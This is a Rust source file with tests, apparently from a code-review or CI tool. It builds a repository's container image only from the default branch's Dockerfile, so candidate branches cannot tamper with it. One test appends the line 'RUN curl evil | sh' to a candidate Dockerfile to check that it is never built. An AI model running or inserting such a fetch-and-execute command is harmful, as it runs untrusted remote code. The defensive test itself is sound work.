//! The image a repository's checks and preparation run in, built by the node
//! from the repository's own Dockerfile.
//!
//! The recipe is read from the repository's default branch through Git's
//! object store, never from a working tree: a candidate that could edit the
//! Dockerfile its own checks run in could make any check pass. What a recipe
//! produced is this node's state (`repo_image`), because a locally built image
//! has a different digest on every node; `[[repo]]` carries only the recipe.

use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex as StdMutex};
use std::time::Duration;

use sha2::{Digest, Sha256};
use tokio::sync::Mutex as AsyncMutex;

use crate::boundary::{Backend, BuildFailure, BuiltImage, ImageBuild, ImageBuilder};
use crate::config::{Config, Repo};
use crate::runner::{Runner, RunnerCommand};
use crate::store::{RepoImageStart, Store};

/// The image checks and preparation run in.
pub const BASE: &str = "base";

/// Bumped when `normalised` changes what it adds, so every repository's image
/// is rebuilt with the new layer.
const NORMALISER: &str = "1";

const RECIPE_LABEL: &str = "io.tracon.recipe";

/// Long enough for a cold build of a full dev environment, short enough that a
/// build waiting on a prompt it will never get does not hold a session's start
/// for ever.
const BUILD_TIMEOUT: Duration = Duration::from_secs(45 * 60);

/// What a repository's image is built from, at one commit of its default
/// branch.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Recipe {
    pub dockerfile: String,
    /// The context directory inside the repository; empty for its root.
    pub context: String,
    pub source_ref: String,
    pub source_commit: String,
    /// The context directory as a Git tree: what the build is given.
    pub context_tree: String,
    /// The Dockerfile, its context and the node's own layer, as one hash. A
    /// commit that touches none of them leaves it — and the image — as it was.
    pub hash: String,
}

/// What `ensure_base` found or made.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Ensured {
    /// The repository's entry names no Dockerfile: nothing here to build.
    Unconfigured,
    /// The image for the current recipe was already built.
    Current(String),
    Rebuilt(String),
    /// The current recipe could not be built; an earlier image still stands.
    Stale {
        using: String,
        error: String,
    },
    /// There is no image for this repository at all.
    Unavailable {
        reason: String,
    },
}

impl Ensured {
    pub fn image(&self) -> Option<&str> {
        match self {
            Ensured::Current(image) | Ensured::Rebuilt(image) => Some(image),
            Ensured::Stale { using, .. } => Some(using),
            Ensured::Unconfigured | Ensured::Unavailable { .. } => None,
        }
    }
}

/// One build at a time per repository: two sessions starting together wait
/// for one image rather than building it twice.
fn build_lock(repo: &Path) -> Arc<AsyncMutex<()>> {
    static LOCKS: std::sync::LazyLock<StdMutex<HashMap<PathBuf, Arc<AsyncMutex<()>>>>> =
        std::sync::LazyLock::new(|| StdMutex::new(HashMap::new()));
    LOCKS
        .lock()
        .unwrap()
        .entry(repo.to_path_buf())
        .or_default()
        .clone()
}

/// The `[[repo]]` entry for `repo`, if it names a Dockerfile to build.
pub fn building_entry<'a>(cfg: &'a Config, repo: &Path) -> Option<&'a Repo> {
    cfg.repo
        .iter()
        .find(|entry| entry.matches(repo))
        .filter(|entry| entry.dockerfile.is_some())
}

/// The recipe `entry` names, as the repository's default branch has it now.
pub async fn recipe(repo: &Path, entry: &Repo) -> Result<Recipe, String> {
    let dockerfile = entry
        .dockerfile
        .clone()
        .ok_or("the repository's entry names no dockerfile")?;
    let context = match entry.context.as_deref() {
        Some(".") => String::new(),
        Some(context) => context.to_string(),
        None => dockerfile
            .rsplit_once('/')
            .map(|(directory, _)| directory.to_string())
            .unwrap_or_default(),
    };
    let dir = repo.to_string_lossy();
    let (source_ref, source_commit) = default_commit(repo).await?;
    let found = |what: &str, path: &str| {
        format!(
            "{what} {path} is not in {source_ref} ({})",
            &source_commit[..source_commit.len().min(12)]
        )
    };
    let blob = crate::review::resolve(&dir, &format!("{source_commit}:{dockerfile}"))
        .await
        .map_err(|_| found("the Dockerfile", &dockerfile))?;
    // `<commit>:<path>` takes everything after the colon as the path, so the
    // root, which has no path, is asked for by peeling the commit instead.
    let tree = match context.is_empty() {
        true => format!("{source_commit}^{{tree}}"),
        false => format!("{source_commit}:{context}"),
    };
    let context_tree = crate::review::resolve(&dir, &tree)
        .await
        .map_err(|_| found("the build context", &context))?;
    let mut hash = Sha256::new();
    for part in [NORMALISER, &dockerfile, &blob, &context, &context_tree] {
        hash.update(part.as_bytes());
        hash.update([0]);
    }
    Ok(Recipe {
        dockerfile,
        context,
        source_ref,
        source_commit,
        context_tree,
        hash: hex::encode(hash.finalize()),
    })
}

/// The commit the recipe is read at. A clone the node manages always has
/// `origin/HEAD`; an operator's own checkout made with `git init` may not, and
/// what it has committed is then the only default there is. Never the working
/// tree, in either case.
async fn default_commit(repo: &Path) -> Result<(String, String), String> {
    let dir = repo.to_string_lossy();
    if let Ok(commit) = crate::review::resolve(&dir, "refs/remotes/origin/HEAD^{commit}").await {
        let name = match crate::review::default_base(&dir).await {
            Ok(branch) => format!("origin/{branch}"),
            Err(_) => "origin/HEAD".into(),
        };
        return Ok((name, commit));
    }
    if repo.starts_with(crate::forge::managed_root(&Config::state_dir())) {
        return Err("the clone has no origin/HEAD to read the Dockerfile from".into());
    }
    crate::review::resolve(&dir, "HEAD^{commit}")
        .await
        .map(|commit| ("HEAD".to_string(), commit))
        .map_err(|_| {
            format!(
                "{} has no commit to read the Dockerfile from",
                repo.display()
            )
        })
}

/// `localhost/tracon-repo-<name>-<hash>`: readable in `podman images`, and
/// distinct for two repositories that share a directory name.
fn image_name(repo: &Path) -> String {
    let slug: String = repo
        .file_name()
        .map(|name| name.to_string_lossy().to_ascii_lowercase())
        .unwrap_or_default()
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() { c } else { '-' })
        .collect();
    let slug = slug.trim_matches('-');
    let hash = hex::encode(Sha256::digest(repo.as_os_str().as_encoded_bytes()));
    match slug.is_empty() {
        true => format!("localhost/tracon-repo-{}", &hash[..10]),
        false => format!("localhost/tracon-repo-{slug}-{}", &hash[..10]),
    }
}

/// The node's layer over a repository's own image, so every run in it meets
/// the same thing whatever the Dockerfile ended on.
///
/// A dev environment usually ends as an unprivileged user in that user's
/// home. Runs here are root with every capability dropped, in `/work`, which
/// root owns: without `USER 0:0` nothing could write the workspace. An
/// `ENTRYPOINT` (a devcontainer's process supervisor) would swallow the
/// command a run names. And a login shell on some bases resets `PATH` for
/// root, losing what the Dockerfile's `ENV PATH` added; the profile line puts
/// it back.
fn normalised(source: &str) -> String {
    format!(
        "FROM {source}\n\
         USER 0:0\n\
         ENV HOME=/root\n\
         RUN mkdir -p /work /cache && if [ -d /etc/profile.d ]; then \
         printf 'export PATH=\"%s\"\\n' \"$PATH\" > /etc/profile.d/zz-tracon-path.sh; fi\n\
         WORKDIR /work\n\
         ENTRYPOINT []\n"
    )
}

/// Make sure the image for `repo`'s current recipe exists, building it if it
/// does not. `force` rebuilds even an image that is current, and retries a
/// recipe that already failed.
///
/// A recipe that fails is not retried on its own: every session start and
/// every check would otherwise repeat a build that takes minutes to fail the
/// same way. The last image that built keeps the repository usable meanwhile.
pub async fn ensure_base(
    backend: &dyn Backend,
    cfg: &Config,
    store: &Store,
    repo: &Path,
    force: bool,
) -> Ensured {
    let Some(entry) = building_entry(cfg, repo) else {
        return Ensured::Unconfigured;
    };
    let Some(builder) = backend.image_builder() else {
        return Ensured::Unavailable {
            reason: format!("the {} runtime cannot build images", backend.kind()),
        };
    };
    let runner = backend.runner(Vec::new());
    let commands = crate::environment::environment_for(cfg, store, Some(repo));
    let commands: Vec<String> = commands
        .checks
        .into_iter()
        .chain(commands.prepare)
        .collect();
    ensure_with(
        builder,
        runner.as_ref(),
        cfg,
        store,
        repo,
        entry,
        &commands,
        force,
    )
    .await
}

/// The environment a run in `repo` gets, with its image built first if the
/// entry names a Dockerfile. A build that fails leaves whatever
/// `environment_for` still resolves: the last image that built, or the
/// harness image with that said.
pub async fn environment(
    backend: &dyn Backend,
    cfg: &Config,
    store: &Store,
    repo: Option<&Path>,
) -> crate::environment::RepoEnvironment {
    if let Some(repo) = repo {
        ensure_base(backend, cfg, store, repo, false).await;
    }
    crate::environment::environment_for(cfg, store, repo)
}

#[allow(clippy::too_many_arguments)]
async fn ensure_with(
    builder: &dyn ImageBuilder,
    runner: &dyn Runner,
    cfg: &Config,
    store: &Store,
    repo: &Path,
    entry: &Repo,
    commands: &[String],
    force: bool,
) -> Ensured {
    let lock = build_lock(repo);
    let _building = lock.lock().await;
    let repo_path = repo.to_string_lossy();
    let ready = match store.ready_repo_image(&repo_path, BASE) {
        Ok(ready) => ready,
        Err(error) => {
            return Ensured::Unavailable {
                reason: error.to_string(),
            }
        }
    };
    // An image the runtime pruned is not one a run can use.
    let standing = match &ready {
        Some(row) if builder.exists(&row.image).await => Some(row.clone()),
        _ => None,
    };
    let fallback = |error: String| match &standing {
        Some(row) => Ensured::Stale {
            using: row.image.clone(),
            error,
        },
        None => Ensured::Unavailable { reason: error },
    };
    let recipe = match recipe(repo, entry).await {
        Ok(recipe) => recipe,
        Err(error) => return fallback(error),
    };
    if !force {
        if let Some(row) = standing
            .as_ref()
            .filter(|row| row.recipe_hash == recipe.hash)
        {
            return Ensured::Current(row.image.clone());
        }
        let latest = store.latest_repo_image(&repo_path, BASE).ok().flatten();
        if let Some(failed) =
            latest.filter(|row| row.status == "failed" && row.recipe_hash == recipe.hash)
        {
            return fallback(format!("{}; `tracon repo build` tries again", failed.error));
        }
    }
    let started = RepoImageStart {
        repo_path: &repo_path,
        kind: BASE,
        recipe_hash: &recipe.hash,
        source_ref: &recipe.source_ref,
        source_commit: &recipe.source_commit,
        parent_image: "",
    };
    let id = match store.start_repo_image(&started) {
        Ok(id) => id,
        Err(error) => return fallback(error.to_string()),
    };
    tracing::info!(repo = %repo.display(), recipe = %recipe.hash, "building repository image");
    match build(builder, cfg, repo, &recipe).await {
        Ok(built) => {
            let warnings = missing_tools(runner, &built.image, commands).await;
            let _ = store.finish_repo_image(&id, Ok(&built.image), &built.log_tail, &warnings);
            if let Some(old) = standing.filter(|old| old.image != built.image) {
                builder.remove(&old.image).await;
                builder.remove(&source_tag(repo, &old.recipe_hash)).await;
            }
            Ensured::Rebuilt(built.image)
        }
        Err(failure) => {
            tracing::warn!(repo = %repo.display(), error = %failure.error, "repository image build failed");
            let _ = store.finish_repo_image(&id, Err(&failure.error), &failure.log_tail, &[]);
            fallback(failure.error)
        }
    }
}

fn source_tag(repo: &Path, recipe_hash: &str) -> String {
    format!(
        "{}-src:{}",
        image_name(repo),
        &recipe_hash[..recipe_hash.len().min(12)]
    )
}

/// Build the repository's own image from its default branch, then the node's
/// layer over it. The context is materialized from Git objects into a
/// directory of the node's; nothing the working tree holds is in it.
async fn build(
    builder: &dyn ImageBuilder,
    cfg: &Config,
    repo: &Path,
    recipe: &Recipe,
) -> Result<BuiltImage, BuildFailure> {
    let staged = |error: String| BuildFailure {
        error,
        log_tail: String::new(),
    };
    let dir = repo.to_string_lossy();
    let stage = tempfile::tempdir().map_err(|e| staged(e.to_string()))?;
    let dockerfile = crate::review::blob(
        &dir,
        &format!("{}:{}", recipe.source_commit, recipe.dockerfile),
    )
    .await
    .map_err(|e| staged(e.to_string()))?;
    let containerfile = stage.path().join("Containerfile");
    std::fs::write(&containerfile, dockerfile).map_err(|e| staged(e.to_string()))?;
    let context = crate::review::snapshot_candidate(
        &dir,
        &recipe.context_tree,
        cfg.supervision.max_snapshot_bytes,
    )
    .await
    .map_err(|e| staged(format!("build context: {e}")))?;
    let labels = [(RECIPE_LABEL.to_string(), recipe.hash.clone())];
    let source = builder
        .build(ImageBuild {
            tag: &source_tag(repo, &recipe.hash),
            containerfile: &containerfile,
            context: &context.root,
            labels: &labels,
            timeout: BUILD_TIMEOUT,
        })
        .await?;

    let layer = stage.path().join("Normalised.Containerfile");
    std::fs::write(&layer, normalised(&source.image)).map_err(|e| staged(e.to_string()))?;
    let empty = stage.path().join("empty");
    std::fs::create_dir_all(&empty).map_err(|e| staged(e.to_string()))?;
    let built = builder
        .build(ImageBuild {
            tag: &format!("{}:{}", image_name(repo), &recipe.hash[..12]),
            containerfile: &layer,
            context: &empty,
            labels: &labels,
            timeout: BUILD_TIMEOUT,
        })
        .await?;
    // The repository's own build is the one worth reading; the layer over it
    // prints a few lines at most.
    Ok(BuiltImage {
        image: built.image,
        log_tail: source.log_tail,
    })
}

/// The commands whose first word the image has no tool for, so the operator
/// hears it when the image is built rather than from a check that could not
/// run. A probe that cannot run says nothing.
async fn missing_tools(runner: &dyn Runner, image: &str, commands: &[String]) -> Vec<String> {
    let mut tools: Vec<&str> = Vec::new();
    for command in commands {
        // An assignment or a path is not a tool the image is expected to hold.
        match command.split_whitespace().next() {
            Some(word) if !word.contains(['=', '/']) && !tools.contains(&word) => tools.push(word),
            _ => {}
        }
    }
    if tools.is_empty() {
        return Vec::new();
    }
    let mut argv: Vec<String> = [
        "sh",
        "-lc",
        "for tool in \"$@\"; do command -v \"$tool\" >/dev/null 2>&1 || echo \"$tool\"; done",
        "sh",
    ]
    .map(String::from)
    .to_vec();
    argv.extend(tools.iter().map(|tool| tool.to_string()));
    let out = runner
        .run_capture(RunnerCommand {
            argv,
            image: Some(image.to_string()),
            name: format!("tracon-probe-{}", uuid::Uuid::now_v7().simple()),
            ..Default::default()
        })
        .await;
    let Ok(out) = out else {
        return Vec::new();
    };
    let missing = String::from_utf8_lossy(&out.stdout);
    commands
        .iter()
        .filter(|command| {
            command
                .split_whitespace()
                .next()
                .is_some_and(|word| missing.lines().any(|line| line.trim() == word))
        })
        .cloned()
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::runner::local::LocalRunner;
    use async_trait::async_trait;

    /// Records what it was asked to build and reads the Containerfile and
    /// context while they still exist, as a real build would.
    #[derive(Default)]
    struct FakeBuilder {
        builds: StdMutex<Vec<(String, String, Vec<String>)>>,
        removed: StdMutex<Vec<String>>,
        fail: StdMutex<bool>,
        pruned: StdMutex<bool>,
    }

    #[async_trait]
    impl ImageBuilder for FakeBuilder {
        async fn build(&self, build: ImageBuild<'_>) -> Result<BuiltImage, BuildFailure> {
            if *self.fail.lock().unwrap() {
                return Err(BuildFailure {
                    error: "podman build exited 1".into(),
                    log_tail: "Error: no such package".into(),
                });
            }
            let text = std::fs::read_to_string(build.containerfile).unwrap();
            let mut files: Vec<String> = std::fs::read_dir(build.context)
                .unwrap()
                .map(|entry| entry.unwrap().file_name().to_string_lossy().into_owned())
                .collect();
            files.sort();
            let name = build.tag.rsplit_once(':').unwrap().0.to_string();
            let digest = hex::encode(Sha256::digest(format!("{}{text}", build.tag)));
            self.builds
                .lock()
                .unwrap()
                .push((build.tag.to_string(), text, files));
            Ok(BuiltImage {
                image: format!("{name}@sha256:{digest}"),
                log_tail: "built".into(),
            })
        }
        async fn exists(&self, _image: &str) -> bool {
            !*self.pruned.lock().unwrap()
        }
        async fn remove(&self, image: &str) {
            self.removed.lock().unwrap().push(image.to_string());
        }
    }

    fn sh(dir: &Path, script: &str) {
        let status = std::process::Command::new("sh")
            .arg("-c")
            .arg(script)
            .current_dir(dir)
            .status()
            .unwrap();
        assert!(status.success(), "{script}");
    }

    /// A checkout whose default branch holds a Dockerfile and one file beside
    /// it, with `origin/HEAD` where a clone would have it.
    fn checkout() -> tempfile::TempDir {
        let tmp = tempfile::tempdir().unwrap();
        sh(
            tmp.path(),
            "git init -q -b main . && git config user.email t@e && git config user.name t \
             && mkdir .devcontainer && printf 'FROM scratch\\nCOPY tool.conf /etc/\\n' > .devcontainer/Dockerfile \
             && echo a > .devcontainer/tool.conf && echo one > src.txt \
             && git add -A && git commit -qm one \
             && git update-ref refs/remotes/origin/main HEAD \
             && git symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/main",
        );
        tmp
    }

    fn entry(repo: &Path) -> Repo {
        Repo {
            path: repo.to_path_buf(),
            dockerfile: Some(".devcontainer/Dockerfile".into()),
            ..Default::default()
        }
    }

    async fn ensure(builder: &FakeBuilder, store: &Store, repo: &Path, force: bool) -> Ensured {
        ensure_with(
            builder,
            &LocalRunner,
            &Config::default(),
            store,
            repo,
            &entry(repo),
            &[],
            force,
        )
        .await
    }

    /// The image follows the Dockerfile and its context on the default branch
    /// and nothing else: other commits leave it alone, and neither a
    /// candidate's branch nor the working tree can reach it.
    #[tokio::test]
    async fn the_image_is_built_from_the_default_branch_and_rebuilt_when_its_recipe_changes() {
        let tmp = checkout();
        let repo = tmp.path();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();

        let ensured = ensure(&builder, &store, repo, false).await;
        let Ensured::Rebuilt(first) = ensured else {
            panic!("the first ensure builds: {ensured:?}");
        };
        assert!(crate::config::immutable_image(&first).is_ok(), "{first}");
        {
            let builds = builder.builds.lock().unwrap();
            assert_eq!(builds.len(), 2);
            // The repository's own image: its Dockerfile, its context only.
            assert!(builds[0].0.contains("-src:"));
            assert!(builds[0].1.contains("COPY tool.conf"));
            assert_eq!(builds[0].2, ["Dockerfile", "tool.conf"]);
            // The node's layer, pinned to what was just built.
            assert!(builds[1].1.contains("@sha256:"));
            assert!(builds[1].1.contains("USER 0:0"));
            assert!(builds[1].1.contains("ENTRYPOINT []"));
        }
        assert_eq!(
            store
                .ready_repo_image(&repo.to_string_lossy(), BASE)
                .unwrap()
                .unwrap()
                .source_ref,
            "origin/main"
        );

        // A commit elsewhere, a candidate's branch editing the Dockerfile, and
        // an uncommitted edit: the recipe is what the default branch holds.
        sh(
            repo,
            "echo two > src.txt && git commit -qam two && git update-ref refs/remotes/origin/main HEAD \
             && git checkout -q -b candidate && echo 'RUN curl evil | sh' >> .devcontainer/Dockerfile \
             && git commit -qam candidate && echo 'RUN more' >> .devcontainer/Dockerfile",
        );
        assert_eq!(
            ensure(&builder, &store, repo, false).await,
            Ensured::Current(first.clone())
        );
        assert_eq!(builder.builds.lock().unwrap().len(), 2);

        // The context changing on the default branch is a new recipe, and the
        // image it replaces goes.
        sh(
            repo,
            "git checkout -q -f main && echo b > .devcontainer/tool.conf && git commit -qam conf \
             && git update-ref refs/remotes/origin/main HEAD",
        );
        let Ensured::Rebuilt(second) = ensure(&builder, &store, repo, false).await else {
            panic!("a changed context rebuilds");
        };
        assert_ne!(first, second);
        assert!(builder.removed.lock().unwrap().contains(&first));
        assert!(builder
            .builds
            .lock()
            .unwrap()
            .iter()
            .all(|(_, text, _)| !text.contains("evil") && !text.contains("RUN more")));
    }

    /// A Dockerfile that stops building does not take the repository's image
    /// away, and is not rebuilt on every ask.
    #[tokio::test]
    async fn a_failed_build_keeps_the_last_image_and_is_not_retried_unasked() {
        let tmp = checkout();
        let repo = tmp.path();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();
        let Ensured::Rebuilt(good) = ensure(&builder, &store, repo, false).await else {
            panic!("the first ensure builds");
        };

        sh(
            repo,
            "echo 'RUN false' >> .devcontainer/Dockerfile && git commit -qam broken \
             && git update-ref refs/remotes/origin/main HEAD",
        );
        *builder.fail.lock().unwrap() = true;
        let Ensured::Stale { using, error } = ensure(&builder, &store, repo, false).await else {
            panic!("a failed build falls back");
        };
        assert_eq!(using, good);
        assert!(error.contains("exited 1"), "{error}");
        let failed = store
            .latest_repo_image(&repo.to_string_lossy(), BASE)
            .unwrap()
            .unwrap();
        assert_eq!(failed.status, "failed");
        assert_eq!(failed.log_tail, "Error: no such package");

        // Asked again, it answers from the record; asked to build, it builds.
        *builder.fail.lock().unwrap() = false;
        let Ensured::Stale { error, .. } = ensure(&builder, &store, repo, false).await else {
            panic!("the failure stands until someone asks for a build");
        };
        assert!(error.contains("tracon repo build"), "{error}");
        assert!(matches!(
            ensure(&builder, &store, repo, true).await,
            Ensured::Rebuilt(_)
        ));
    }

    /// With no image that ever built, a failure leaves nothing to run in; and
    /// an image the runtime no longer holds is built again rather than named.
    #[tokio::test]
    async fn an_image_that_is_gone_is_built_again() {
        let tmp = checkout();
        let repo = tmp.path();
        let store = Store::open_in_memory().unwrap();
        let builder = FakeBuilder::default();

        let missing = Repo {
            dockerfile: Some("docker/Dockerfile".into()),
            ..entry(repo)
        };
        let unavailable = ensure_with(
            &builder,
            &LocalRunner,
            &Config::default(),
            &store,
            repo,
            &missing,
            &[],
            false,
        )
        .await;
        let Ensured::Unavailable { reason } = unavailable else {
            panic!("a Dockerfile the default branch does not hold cannot build");
        };
        assert!(
            reason.contains("docker/Dockerfile is not in origin/main"),
            "{reason}"
        );

        assert!(matches!(
            ensure(&builder, &store, repo, false).await,
            Ensured::Rebuilt(_)
        ));
        *builder.pruned.lock().unwrap() = true;
        assert!(matches!(
            ensure(&builder, &store, repo, false).await,
            Ensured::Rebuilt(_)
        ));
    }

    #[tokio::test]
    async fn a_command_the_image_has_no_tool_for_is_named_when_it_is_built() {
        let commands = [
            "sh -c true".to_string(),
            "tracon-no-such-tool --check".to_string(),
            "FOO=1 make".to_string(),
            "./scripts/check.sh".to_string(),
        ];
        assert_eq!(
            missing_tools(&LocalRunner, "ignored", &commands).await,
            ["tracon-no-such-tool --check"]
        );
    }

    #[test]
    fn image_names_are_readable_and_distinct() {
        let a = image_name(Path::new("/src/My App"));
        let b = image_name(Path::new("/other/My App"));
        assert!(a.starts_with("localhost/tracon-repo-my-app-"), "{a}");
        assert_ne!(a, b);
        assert!(a
            .trim_start_matches("localhost/")
            .bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-'));
    }
}
